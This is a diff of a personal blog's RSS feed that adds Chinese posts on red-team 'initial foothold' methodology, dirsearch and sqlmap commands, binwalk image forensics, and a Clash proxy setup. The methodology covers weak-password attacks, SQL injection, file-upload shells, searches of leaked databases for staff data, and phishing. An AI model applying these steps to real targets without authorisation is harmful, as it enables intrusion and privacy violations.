@@ -9,13 +9,129 @@
     <atom:link href="http://blog.xingxiaowu.cn/rss2.xml" rel="self" type="application/rss+xml"/>
     
     <description>一个么的前途的弟中弟</description>
-    <pubDate>Fri, 17 May 2024 06:23:00 GMT</pubDate>
+    <pubDate>Fri, 07 Jun 2024 02:03:46 GMT</pubDate>
     <generator>http://hexo.io/</generator>
     
     <item>
+      <title>无星的渗透之旅速成篇（四）-记录checklist</title>
+      <link>http://blog.xingxiaowu.cn/2024/06/06/CTF/%E6%97%A0%E6%98%9F%E7%9A%84%E6%B8%97%E9%80%8F%E4%B9%8B%E6%97%85%E9%80%9F%E6%88%90%E7%AF%87%EF%BC%88%E5%9B%9B%EF%BC%89-checklist/</link>
+      <guid>http://blog.xingxiaowu.cn/2024/06/06/CTF/%E6%97%A0%E6%98%9F%E7%9A%84%E6%B8%97%E9%80%8F%E4%B9%8B%E6%97%85%E9%80%9F%E6%88%90%E7%AF%87%EF%BC%88%E5%9B%9B%EF%BC%89-checklist/</guid>
+      <pubDate>Thu, 06 Jun 2024 12:09:00 GMT</pubDate>
+      
+      
+      
+      
+      <category domain="http://blog.xingxiaowu.cn/categories/%E5%AE%89%E5%85%A8/">安全</category>
+      
+      
+      <category domain="http://blog.xingxiaowu.cn/tags/%E6%B8%97%E9%80%8F/">渗透</category>
+      
+      
+      <comments>http://blog.xingxiaowu.cn/2024/06/06/CTF/%E6%97%A0%E6%98%9F%E7%9A%84%E6%B8%97%E9%80%8F%E4%B9%8B%E6%97%85%E9%80%9F%E6%88%90%E7%AF%87%EF%BC%88%E5%9B%9B%EF%BC%89-checklist/#disqus_thread</comments>
+      
+    </item>
+    
+    <item>
+      <title>Clash代理游戏</title>
+      <link>http://blog.xingxiaowu.cn/2024/05/25/%E8%BF%90%E7%BB%B4%E6%9D%82%E8%B0%88/Clash%E4%BB%A3%E7%90%86%E6%B8%B8%E6%88%8F/</link>
+      <guid>http://blog.xingxiaowu.cn/2024/05/25/%E8%BF%90%E7%BB%B4%E6%9D%82%E8%B0%88/Clash%E4%BB%A3%E7%90%86%E6%B8%B8%E6%88%8F/</guid>
+      <pubDate>Sat, 25 May 2024 07:48:00 GMT</pubDate>
+      
+      <description>&lt;p&gt;最近想玩鹅鸭杀&lt;/p&gt;
+&lt;p&gt;苦于没钱买加速器&lt;/p&gt;
+&lt;p&gt;但是干程序员的&lt;/p&gt;
+&lt;p&gt;梯子都有&lt;/p&gt;
+&lt;p&gt;梯子为什么不能加速呢？&lt;/p&gt;
+&lt;p&gt;我使用的是Clash_for_windows&lt;/p&gt;
+&lt;p&gt;查了一下&lt;/p&gt;
+&lt;p&gt;确实可以&lt;/p&gt;
+&lt;p&gt;下面是步骤教学&lt;/p&gt;
+&lt;h1 id=&quot;1-下载TUN插件&quot;&gt;&lt;a href=&quot;#1-下载TUN插件&quot; class=&quot;headerlink&quot; title=&quot;1.下载TUN插件&quot;&gt;&lt;/a&gt;1.下载TUN插件&lt;/h1&gt;</description>
+      
+      
+      
+      <content:encoded><![CDATA[<p>最近想玩鹅鸭杀</p><p>苦于没钱买加速器</p><p>但是干程序员的</p><p>梯子都有</p><p>梯子为什么不能加速呢？</p><p>我使用的是Clash_for_windows</p><p>查了一下</p><p>确实可以</p><p>下面是步骤教学</p><h1 id="1-下载TUN插件"><a href="#1-下载TUN插件" class="headerlink" title="1.下载TUN插件"></a>1.下载TUN插件</h1><p><a href="https://www.wintun.net/">https://www.wintun.net/</a> </p><p>下载就完事了</p><h1 id="2-复制-wintun-插件到-Clash-中"><a href="#2-复制-wintun-插件到-Clash-中" class="headerlink" title="2.复制 wintun 插件到 Clash 中"></a>2.复制 wintun 插件到 Clash 中</h1><p>打开主目录<br><img src="https://cdn.jsdelivr.net/gh/XingXiaoWu/XingXiaoWu.github.io@pic/Clash1/20240525203933.png"></p><p>大家应该都是amd的卡</p><p>复制<code>\wintun-0.14.1\wintun\bin\amd64\wintun.dll</code>到这个目录下就完事了</p><h1 id="3-激活TUN插件"><a href="#3-激活TUN插件" class="headerlink" title="3.激活TUN插件"></a>3.激活TUN插件</h1><p>点击 Clash 首页 Service Mode 右侧的 Manage，再点击 Install。此时系统可能会弹出 UAC 提示，允许后 Clash 会自动重启。</p><p>如重启后 Service Mode 右侧地球变为绿色，表示激活成功。</p><p><img src="https://cdn.jsdelivr.net/gh/XingXiaoWu/XingXiaoWu.github.io@pic/Clash1/20240525204129.png"></p><h1 id="4-启动-TUN-模式"><a href="#4-启动-TUN-模式" class="headerlink" title="4.启动 TUN 模式"></a>4.启动 TUN 模式</h1><p>返回 Clash 主页，关闭 System Proxy 并开启 TUN 即可，此时所有流量都会通过 Clash 进行分流。默认 rule 模式下，国内所有 ip 和域名均不会走代理服务器，但请尤其注意系统更新，游戏更新等流量。</p><p><img src="https://cdn.jsdelivr.net/gh/XingXiaoWu/XingXiaoWu.github.io@pic/Clash1/20240525204204.png"><br>正确开启的情况下，系统会多出一个名为 Clash 的网卡。</p><p>如需关闭 TUN 模式，首页关闭 TUN 并开启 System Proxy 即可。</p>]]></content:encoded>
+      
+      
+      <category domain="http://blog.xingxiaowu.cn/categories/clash/">clash</category>
+      
+      
+      <category domain="http://blog.xingxiaowu.cn/tags/clash/">clash</category>
+      
+      
+      <comments>http://blog.xingxiaowu.cn/2024/05/25/%E8%BF%90%E7%BB%B4%E6%9D%82%E8%B0%88/Clash%E4%BB%A3%E7%90%86%E6%B8%B8%E6%88%8F/#disqus_thread</comments>
+      
+    </item>
+    
+    <item>
+      <title>无星的安全之旅（八）——图片</title>
+      <link>http://blog.xingxiaowu.cn/2024/05/20/CTF/%E6%97%A0%E6%98%9F%E7%9A%84%E5%AE%89%E5%85%A8%E4%B9%8B%E6%97%85%EF%BC%88%E5%85%AB%EF%BC%89%E2%80%94%E2%80%94%E5%9B%BE%E7%89%87/</link>
+      <guid>http://blog.xingxiaowu.cn/2024/05/20/CTF/%E6%97%A0%E6%98%9F%E7%9A%84%E5%AE%89%E5%85%A8%E4%B9%8B%E6%97%85%EF%BC%88%E5%85%AB%EF%BC%89%E2%80%94%E2%80%94%E5%9B%BE%E7%89%87/</guid>
+      <pubDate>Mon, 20 May 2024 12:17:00 GMT</pubDate>
+      
+      <description>&lt;p&gt;实不相瞒，看到图片我就头痛&lt;/p&gt;
+&lt;p&gt;现在看到图片&lt;/p&gt;
+&lt;p&gt;我上去第一件事&lt;/p&gt;
+&lt;p&gt;你这玩意是不是塞了什么小玩具&lt;/p&gt;
+&lt;h1 id=&quot;打开kali&quot;&gt;&lt;a href=&quot;#打开kali&quot; class=&quot;headerlink&quot; title=&quot;打开kali&quot;&gt;&lt;/a&gt;打开kali&lt;/h1&gt;&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;binwalk ~/1.png&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;p&gt;康康里面是不是塞了什么&lt;/p&gt;
+&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;binwalk ~/1.png -e&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;p&gt;分离图片&lt;/p&gt;
+&lt;p&gt;剩下的再看&lt;/p&gt;</description>
+      
+      
+      
+      <content:encoded><![CDATA[<p>实不相瞒，看到图片我就头痛</p><p>现在看到图片</p><p>我上去第一件事</p><p>你这玩意是不是塞了什么小玩具</p><h1 id="打开kali"><a href="#打开kali" class="headerlink" title="打开kali"></a>打开kali</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">binwalk ~/1.png</span><br></pre></td></tr></table></figure><p>康康里面是不是塞了什么</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">binwalk ~/1.png -e</span><br></pre></td></tr></table></figure><p>分离图片</p><p>剩下的再看</p>]]></content:encoded>
+      
+      
+      <category domain="http://blog.xingxiaowu.cn/categories/%E5%AE%89%E5%85%A8/">安全</category>
+      
+      
+      <category domain="http://blog.xingxiaowu.cn/tags/CTF/">CTF</category>
+      
+      
+      <comments>http://blog.xingxiaowu.cn/2024/05/20/CTF/%E6%97%A0%E6%98%9F%E7%9A%84%E5%AE%89%E5%85%A8%E4%B9%8B%E6%97%85%EF%BC%88%E5%85%AB%EF%BC%89%E2%80%94%E2%80%94%E5%9B%BE%E7%89%87/#disqus_thread</comments>
+      
+    </item>
+    
+    <item>
+      <title>无星的渗透之旅速成篇（三）-记录常用的命令</title>
+      <link>http://blog.xingxiaowu.cn/2024/05/07/CTF/%E6%97%A0%E6%98%9F%E7%9A%84%E6%B8%97%E9%80%8F%E4%B9%8B%E6%97%85%E9%80%9F%E6%88%90%E7%AF%87%EF%BC%88%E4%B8%89%EF%BC%89-%E8%AE%B0%E5%BD%95%E5%B8%B8%E7%94%A8%E7%9A%84%E5%91%BD%E4%BB%A4/</link>
+      <guid>http://blog.xingxiaowu.cn/2024/05/07/CTF/%E6%97%A0%E6%98%9F%E7%9A%84%E6%B8%97%E9%80%8F%E4%B9%8B%E6%97%85%E9%80%9F%E6%88%90%E7%AF%87%EF%BC%88%E4%B8%89%EF%BC%89-%E8%AE%B0%E5%BD%95%E5%B8%B8%E7%94%A8%E7%9A%84%E5%91%BD%E4%BB%A4/</guid>
+      <pubDate>Tue, 07 May 2024 12:09:00 GMT</pubDate>
+      
+      <description>&lt;h1 id=&quot;dirsearch&quot;&gt;&lt;a href=&quot;#dirsearch&quot; class=&quot;headerlink&quot; title=&quot;dirsearch&quot;&gt;&lt;/a&gt;dirsearch&lt;/h1&gt;&lt;p&gt;扫描&lt;/p&gt;
+&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;python dirsearch.py -u http://222.93.xx.xx:8090&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;指定字典扫描&lt;/p&gt;
+&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;python dirsearch.py -u http://222.93.xx.xx:8090 -w dic.txt&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;保留200&lt;/p&gt;
+&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;python dirsearch.py -u http://222.93.xx.xx:8090 -i 200&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;批量地址扫描&lt;/p&gt;
+&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;python dirsearch.py -l url.txt -i 200&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;p&gt;如果遇到https问题&lt;/p&gt;</description>
+      
+      
+      
+      <content:encoded><![CDATA[<h1 id="dirsearch"><a href="#dirsearch" class="headerlink" title="dirsearch"></a>dirsearch</h1><p>扫描</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python dirsearch.py -u http://222.93.xx.xx:8090</span><br></pre></td></tr></table></figure><p>指定字典扫描</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python dirsearch.py -u http://222.93.xx.xx:8090 -w dic.txt</span><br></pre></td></tr></table></figure><p>保留200</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python dirsearch.py -u http://222.93.xx.xx:8090 -i 200</span><br></pre></td></tr></table></figure><p>批量地址扫描</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python dirsearch.py -l url.txt -i 200</span><br></pre></td></tr></table></figure><p>如果遇到https问题</p><p>打开burp，然后设置代理到本机即可</p><p>代理</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python dirsearch.py -l url.txt -i 200 --proxy=localhost:8080</span><br></pre></td></tr></table></figure><p>代理池</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python dirsearch.py -l url.txt -i 200 --proxy-file=/path/to/proxies.txt</span><br></pre></td></tr></table></figure><h1 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h1><p>扫描接口</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://xxxx?tidId=1&quot;</span><br></pre></td></tr></table></figure><p>参数好多，只扫某些</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://xxxx?tidId=1&amp;id=2&amp;pp=3&quot; -p &quot;tidId,id&quot;</span><br></pre></td></tr></table></figure><p>ssl问题，同样开burp</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://xxxx?tidId=1&amp;id=2&amp;pp=3&quot; -p &quot;tidId,id&quot; -proxy &quot;http://127.0.0.1:8080&quot; --force-ssl</span><br></pre></td></tr></table></figure>]]></content:encoded>
+      
+      
+      <category domain="http://blog.xingxiaowu.cn/categories/%E5%AE%89%E5%85%A8/">安全</category>
+      
+      
+      <category domain="http://blog.xingxiaowu.cn/tags/%E6%B8%97%E9%80%8F/">渗透</category>
+      
+      
+      <comments>http://blog.xingxiaowu.cn/2024/05/07/CTF/%E6%97%A0%E6%98%9F%E7%9A%84%E6%B8%97%E9%80%8F%E4%B9%8B%E6%97%85%E9%80%9F%E6%88%90%E7%AF%87%EF%BC%88%E4%B8%89%EF%BC%89-%E8%AE%B0%E5%BD%95%E5%B8%B8%E7%94%A8%E7%9A%84%E5%91%BD%E4%BB%A4/#disqus_thread</comments>
+      
+    </item>
+    
+    <item>
       <title>无星的渗透之旅速成篇（一）-https抓包</title>
-      <link>http://blog.xingxiaowu.cn/2024/05/07/CTF/%E6%97%A0%E6%98%9F%E7%9A%84%E6%B8%97%E9%80%8F%E4%B9%8B%E6%97%85%E9%80%9F%E6%88%90%E7%AF%87%EF%BC%88%E4%B8%80%EF%BC%89/</link>
-      <guid>http://blog.xingxiaowu.cn/2024/05/07/CTF/%E6%97%A0%E6%98%9F%E7%9A%84%E6%B8%97%E9%80%8F%E4%B9%8B%E6%97%85%E9%80%9F%E6%88%90%E7%AF%87%EF%BC%88%E4%B8%80%EF%BC%89/</guid>
+      <link>http://blog.xingxiaowu.cn/2024/05/07/CTF/%E6%97%A0%E6%98%9F%E7%9A%84%E6%B8%97%E9%80%8F%E4%B9%8B%E6%97%85%E9%80%9F%E6%88%90%E7%AF%87%EF%BC%88%E4%B8%80%EF%BC%89-https%E6%8A%93%E5%8C%85/</link>
+      <guid>http://blog.xingxiaowu.cn/2024/05/07/CTF/%E6%97%A0%E6%98%9F%E7%9A%84%E6%B8%97%E9%80%8F%E4%B9%8B%E6%97%85%E9%80%9F%E6%88%90%E7%AF%87%EF%BC%88%E4%B8%80%EF%BC%89-https%E6%8A%93%E5%8C%85/</guid>
       <pubDate>Tue, 07 May 2024 12:09:00 GMT</pubDate>
       
       <description>&lt;h1 id=&quot;背景&quot;&gt;&lt;a href=&quot;#背景&quot; class=&quot;headerlink&quot; title=&quot;背景&quot;&gt;&lt;/a&gt;背景&lt;/h1&gt;&lt;p&gt;抓包很常见，以前做开发的时候也经常用&lt;/p&gt;
@@ -38,7 +154,38 @@
       <category domain="http://blog.xingxiaowu.cn/tags/%E6%B8%97%E9%80%8F/">渗透</category>
       
       
-      <comments>http://blog.xingxiaowu.cn/2024/05/07/CTF/%E6%97%A0%E6%98%9F%E7%9A%84%E6%B8%97%E9%80%8F%E4%B9%8B%E6%97%85%E9%80%9F%E6%88%90%E7%AF%87%EF%BC%88%E4%B8%80%EF%BC%89/#disqus_thread</comments>
+      <comments>http://blog.xingxiaowu.cn/2024/05/07/CTF/%E6%97%A0%E6%98%9F%E7%9A%84%E6%B8%97%E9%80%8F%E4%B9%8B%E6%97%85%E9%80%9F%E6%88%90%E7%AF%87%EF%BC%88%E4%B8%80%EF%BC%89-https%E6%8A%93%E5%8C%85/#disqus_thread</comments>
+      
+    </item>
+    
+    <item>
+      <title>无星的渗透之旅速成篇（二）-打点</title>
+      <link>http://blog.xingxiaowu.cn/2024/05/07/CTF/%E6%97%A0%E6%98%9F%E7%9A%84%E6%B8%97%E9%80%8F%E4%B9%8B%E6%97%85%E9%80%9F%E6%88%90%E7%AF%87%EF%BC%88%E4%BA%8C%EF%BC%89-%E6%89%93%E7%82%B9/</link>
+      <guid>http://blog.xingxiaowu.cn/2024/05/07/CTF/%E6%97%A0%E6%98%9F%E7%9A%84%E6%B8%97%E9%80%8F%E4%B9%8B%E6%97%85%E9%80%9F%E6%88%90%E7%AF%87%EF%BC%88%E4%BA%8C%EF%BC%89-%E6%89%93%E7%82%B9/</guid>
+      <pubDate>Tue, 07 May 2024 12:09:00 GMT</pubDate>
+      
+      <description>&lt;p&gt;阿星还是个新人&lt;/p&gt;
+&lt;p&gt;不知道正确的渗透步骤是什么&lt;/p&gt;
+&lt;p&gt;这里看到一个打点步骤&lt;/p&gt;
+&lt;p&gt;遂记录下来&lt;/p&gt;
+&lt;h1 id=&quot;打点的基本方法&quot;&gt;&lt;a href=&quot;#打点的基本方法&quot; class=&quot;headerlink&quot; title=&quot;打点的基本方法&quot;&gt;&lt;/a&gt;打点的基本方法&lt;/h1&gt;&lt;p&gt;基本方法，无非就是信息搜集–&amp;gt;找到脆弱资产–&amp;gt;漏洞利用→getshell，说起来是很简单的。&lt;/p&gt;
+&lt;p&gt;这其中最肝的一个部分，莫过于信息搜集了，纯体力活。&lt;/p&gt;
+&lt;p&gt;当然，过程可以用工具相对优化，但我依旧认为是最无脑的一个部分，就像大学生和小学生（高阶和低阶技术人员）一起用计算器（各种工具 fofa goby oneforall等）来算1w道加减乘除题（大量的资产 域名子域名 c段等）一样，其实是区分不开技术人员的水平的，很多头部的公司早就认识到了这一点，于是在大型攻防演练中，通常是派大量的人来进行资产收集，然后筛选出其中的脆弱资产后把资产给后续的利用人员来进内网快速拿分。&lt;/p&gt;
+&lt;p&gt;虽然信息搜集很无脑，但是该说还是得说，这个事情一般有以下几个步骤。&lt;/p&gt;
+&lt;p&gt;1、当项目经理告诉了你攻击目标的时候 →得到公司名→上企查查搜公司名→搜出来一堆公司和子公司&lt;/p&gt;</description>
+      
+      
+      
+      <content:encoded><![CDATA[<p>阿星还是个新人</p><p>不知道正确的渗透步骤是什么</p><p>这里看到一个打点步骤</p><p>遂记录下来</p><h1 id="打点的基本方法"><a href="#打点的基本方法" class="headerlink" title="打点的基本方法"></a>打点的基本方法</h1><p>基本方法，无非就是信息搜集–&gt;找到脆弱资产–&gt;漏洞利用→getshell，说起来是很简单的。</p><p>这其中最肝的一个部分，莫过于信息搜集了，纯体力活。</p><p>当然，过程可以用工具相对优化，但我依旧认为是最无脑的一个部分，就像大学生和小学生（高阶和低阶技术人员）一起用计算器（各种工具 fofa goby oneforall等）来算1w道加减乘除题（大量的资产 域名子域名 c段等）一样，其实是区分不开技术人员的水平的，很多头部的公司早就认识到了这一点，于是在大型攻防演练中，通常是派大量的人来进行资产收集，然后筛选出其中的脆弱资产后把资产给后续的利用人员来进内网快速拿分。</p><p>虽然信息搜集很无脑，但是该说还是得说，这个事情一般有以下几个步骤。</p><p>1、当项目经理告诉了你攻击目标的时候 →得到公司名→上企查查搜公司名→搜出来一堆公司和子公司</p><p>2、拿到这堆公司和子公司的名字→oneforall来跑一遍→然后得到了一堆子域名</p><p>3、拿到这堆子域名丢给Eeyes跑一遍→得到对应子域名对应的ip和c段信息</p><p>4、将对应ip和c段丢给fofa和fscan→fofa能快速得到c段资产信息，fscan能快速扫一遍，顺便帮你打一下常用漏洞</p><p>5、如果你的运气足够好，这个时候fscan已经有漏洞爆出来了，可以直接去利用了（小概率事件），但是如果你的运气不好，就要看接下来的第6步</p><p>6、刚刚fofa得到的资产看一眼，这里可以配合ehole的指纹识别来帮助快速筛选，通过筛选敏感资产，例如shiro，fastjson等直接能够反序列化getshell的资产（小概率事件），如果你的运气好，那么这个时候已经有漏洞了，可以直接利用了，如果你的运气不好，就要看接下来的第7步</p><p>7、通过上面一番筛选，时间已经过去很久了，但是目前却毫无进展，其实心里有点郁闷，这个时候就不建议再搞了，先休息一下，调整下心态，不然后续的几天会大幅度降低工作效率，休息好了感觉又可以了，就看看下面的步骤8继续吧</p><p>8、其实经过上面的一番筛选，web这块的基本已经过完了，但是依旧还没有漏洞，说明这个系统平时自查搞的比较多，基本的高危漏洞修复已经完成了，如果是大型攻防演练，那就建议换个目标再用上面的方法轮一次，如果是就某家单位做的定向攻防，就继续看步骤9吧</p><p>9、web的过完了，虽然没有直接能够rce的系统，但是我们获得了很多形形色色的登录后台\用户登录\注册\管理员登录等等等等交互类型的资产，这些资产虽然看起来没用，但是我这里要介绍一下攻防演练的三板斧漏洞，运气好的话，这些资产还是能够派上用场的</p><p>三板斧其一 反序列化漏洞：这个不用多说，我最喜欢的漏洞，只要有了这个漏洞，基本一台机子的shell就拿到了，看到就眼睛放光，但是可遇不可求，遍地都是shiro的时代已经渐渐过去了。</p><p>三板斧其二 文件上传：这个也是老熟人了，一般我会先看看是不是白名单，是白名单的话，就看看有没有文件包含之类的漏洞能组合利用下，如果是黑名单，就把文件上传的姿势对着上传点全部来一遍，看看有没有一个能中，如果能中，那就有了一个shell（没路径连不上但是确实是shell），虽然找上传路径也是一个拦路虎，但是至少比传不上去强。</p><p>三板斧其三 sql注入：这个更加老熟人了，注入之后，低权限，直接gg，高权限，试试吧，看能不能上shell。</p><p>至于其他漏洞，攻防演练就那么几天时间，八成是用不上，建议直接放弃，就把上面三个玩精（仅仅就攻防项目来说）。</p><p>10、对各种登录系统尝试弱口令&#x2F;sql注入攻击，弱口令能登进去后台就找上传点，sql注入建议xray+burp来测，看到有戏的再上sqlmap。</p><p>还有一些信息搜集的方法，比如fofa搜关键字，title&#x3D;”单位名”等，这种方法可以自行穿插灵活使用，有时候有奇效，有时候没啥效果，看个人造化了。</p><p>还有些天选之人，直接一个弱口令登云桌面（horizon、vdi等）然后拿shell的，这种属于天赐shell，不在常规考虑范围之内，但也可以尝试。</p><p>11、弱口令如果爆不出账号密码，就考虑上网盘\github\sgk\泄露公开库搜对应人员的信息，看看好使不</p><p>12、如果还是没有用，就可以开始看公众号\app\小程序的信息</p><p>13、如果还是没有用，就要开始用域传送\备案号\ip反查网站\ssl证书\用google来搜c段</p><p>14、如果还是没有用，就用dirmap\dirsearch来对可疑的网站进行目录爆破，看看好使不</p><p>15、如果还是没有用，还可以钓鱼，发邮件也是一个体力活</p><p>16、如果还是没有用，拿上设备跟领导申请近源渗透吧</p><p>列了这么多，我就是想说明，虽然信息搜集是一项很重要的工作，是开启后渗透的基础，但这项工作是体力活真的是不争的事实，因为他没有门槛，基本谁都能做，无非就是用工具对着一项项checklist不断的去尝试而已。</p><p>因此通常意义上的快速打点，就是比谁先试完所有的checklist，虽然目前绝大部分工作都是由工 具来完成，整个项目呈一个半自动化的流程，但是仍然架不住资产量的庞大，一个信息收集熟练的人，无非也就是流水线的工人而已，对着巨量的资产不断的用工具筛选而已。</p><p>而一些高端打点技巧玩得好的人，例如电话钓鱼成功率很大的人，钓鱼邮件的撰写和钓鱼样本的开发做的很牛的人，在做这些事情之前，同样需要信息搜集，而能够玩高端技巧的人是不愿意来做信息搜集的，因为他们也是从小白阶段过来的，明白信息搜集这项繁重且技术含量低的工作完全可以找别人来做。</p><p>从公司层面上来讲，要快速打点，就要投入更多的人。从个人层面上来讲，要快速打点，要忍受枯燥的打点过程，然后提升自己的工具使用速度，最好自己能够进行二次开发，把一些半自动化的步骤连接起来，优化现有的步骤，从而进一步提升效率。</p>]]></content:encoded>
+      
+      
+      <category domain="http://blog.xingxiaowu.cn/categories/%E5%AE%89%E5%85%A8/">安全</category>
+      
+      
+      <category domain="http://blog.xingxiaowu.cn/tags/%E6%B8%97%E9%80%8F/">渗透</category>
+      
+      
+      <comments>http://blog.xingxiaowu.cn/2024/05/07/CTF/%E6%97%A0%E6%98%9F%E7%9A%84%E6%B8%97%E9%80%8F%E4%B9%8B%E6%97%85%E9%80%9F%E6%88%90%E7%AF%87%EF%BC%88%E4%BA%8C%EF%BC%89-%E6%89%93%E7%82%B9/#disqus_thread</comments>
       
     </item>
     
@@ -212,165 +359,6 @@
       
       
       <comments>http://blog.xingxiaowu.cn/2023/09/07/CTF/%E6%97%A0%E6%98%9F%E7%9A%84%E5%AE%89%E5%85%A8%E4%B9%8B%E6%97%85%EF%BC%88%E5%9B%9B%EF%BC%89%E2%80%94%E2%80%94%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/#disqus_thread</comments>
-      
-    </item>
-    
-    <item>
-      <title>无星的安全之旅（三）——互联网渗透</title>
-      <link>http://blog.xingxiaowu.cn/2023/09/06/CTF/%E6%97%A0%E6%98%9F%E7%9A%84%E5%AE%89%E5%85%A8%E4%B9%8B%E6%97%85%EF%BC%88%E4%B8%89%EF%BC%89%E2%80%94%E2%80%94%E4%BA%92%E8%81%94%E7%BD%91%E6%B8%97%E9%80%8F/</link>
-      <guid>http://blog.xingxiaowu.cn/2023/09/06/CTF/%E6%97%A0%E6%98%9F%E7%9A%84%E5%AE%89%E5%85%A8%E4%B9%8B%E6%97%85%EF%BC%88%E4%B8%89%EF%BC%89%E2%80%94%E2%80%94%E4%BA%92%E8%81%94%E7%BD%91%E6%B8%97%E9%80%8F/</guid>
-      <pubDate>Wed, 06 Sep 2023 12:17:00 GMT</pubDate>
-      
-      <description>&lt;p&gt;互联网渗透的流程&lt;/p&gt;
-&lt;p&gt;信息收集-&amp;gt;突破边界-&amp;gt;横向移动&lt;/p&gt;
-&lt;h1 id=&quot;信息收集&quot;&gt;&lt;a href=&quot;#信息收集&quot; class=&quot;headerlink&quot; title=&quot;信息收集&quot;&gt;&lt;/a&gt;信息收集&lt;/h1&gt;&lt;h2 id=&quot;指纹识别&quot;&gt;&lt;a href=&quot;#指纹识别&quot; class=&quot;headerlink&quot; title=&quot;指纹识别&quot;&gt;&lt;/a&gt;指纹识别&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://microsoftedge.microsoft.com/addons/detail/mnbndgmknlpdjdnjfmfcdjoegcckoikn&quot;&gt;&lt;code&gt;Wappalyzer&lt;/code&gt;&lt;/a&gt;浏览器插件&lt;/p&gt;
-&lt;p&gt;&lt;a href=&quot;https://github.com/EdgeSecurityTeam/EHole&quot;&gt;Ehole&lt;/a&gt;&lt;br&gt;内置指纹规则，识别CMS，可自行添加规则&lt;/p&gt;
-&lt;h2 id=&quot;子域名收集&quot;&gt;&lt;a href=&quot;#子域名收集&quot; class=&quot;headerlink&quot; title=&quot;子域名收集&quot;&gt;&lt;/a&gt;子域名收集&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://fofa.info/&quot;&gt;&lt;code&gt;fofa&lt;/code&gt;&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;&lt;a href=&quot;https://hunter.qianxin.com/&quot;&gt;&lt;code&gt;鹰图&lt;/code&gt;&lt;/a&gt;&lt;/p&gt;
